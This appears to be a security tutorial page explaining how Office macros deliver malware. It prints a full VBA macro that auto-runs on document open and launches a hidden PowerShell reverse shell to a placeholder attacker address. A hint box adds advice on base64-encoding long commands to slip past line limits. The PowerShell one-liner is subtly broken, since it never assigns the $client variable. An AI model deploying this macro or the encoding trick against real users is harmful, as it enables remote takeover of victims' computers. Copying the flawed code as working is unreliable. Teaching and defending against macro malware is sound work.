# Macros in Office

Macros are a powerful feature primarily used in Microsoft Office applications like Word, Excel, and Access. They are designed to automate repetitive tasks by executing a series of commands and functions embedded within a document. While macros can greatly increase productivity, they can also be exploited to deliver malware, including ransomware and backdoors.

#### How Macros Can Be Malicious

Attackers often use macros as a delivery mechanism for malicious code. When a user opens a document and enables macros, the embedded code executes, which can lead to undesirable actions. These actions can range from downloading malware from external servers to executing commands directly on the user's system.

The deceptive nature of macros lies in their ability to look innocuous while performing harmful actions in the background. Attackers typically spread such malicious documents through phishing emails, claiming the content is important and urging the recipient to enable macros to view the content.

#### Example of a Malicious Macro

Below is an example of a VBA (Visual Basic for Applications) macro designed to open a reverse shell on a Windows system. This can give an attacker remote access to the victim's computer.

```vba
Sub AutoOpen()
    OpenReverseShell
End Sub

Sub OpenReverseShell()
    Dim strShellPath As String
    strShellPath = "cmd.exe /c powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient('attacker_ip',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
    Shell strShellPath
End Sub
```

#### Breakdown of the Macro Code

* **AutoOpen**: This subroutine is automatically called when the document is opened, provided macros are enabled. It calls the `OpenReverseShell` subroutine.
* **OpenReverseShell**: This subroutine constructs a command string to open a command shell (`cmd.exe`), which then uses PowerShell to create a TCP connection back to the attacker's specified IP address and port (`attacker_ip`, `4444`). The shell sends its output back through this connection, effectively giving shell access to the attacker.
* **Powershell Command**: The PowerShell script sets up a `TCPClient` socket to the attacker's specified address. It reads commands sent from the attacker's server, executes them on the victim's machine, and sends the results back to the attacker.



{% hint style="info" %}
**String Length**: VBA supports a maximum string length of about 2 billion characters, which is typically more than sufficient for most macro scripts. However, the practical limits for a single line of code or string literals in VBA are much lower, usually around 1024 characters. This limit can impact the way scripts are written, particularly when embedding long shell commands or scripts directly into the VBA code; A workaround could be to base64 encode the command and concatenate it across multiple lines.
{% endhint %}

#### Security Implications

Such macros pose significant security risks and exemplify why macros should be handled with caution. Many organizations choose to disable macros by default or only allow macros from trusted sources. Additionally, modern versions of Microsoft Office prompt users before enabling macros, especially when they originate from the internet, as part of their security features to mitigate unauthorized code execution.
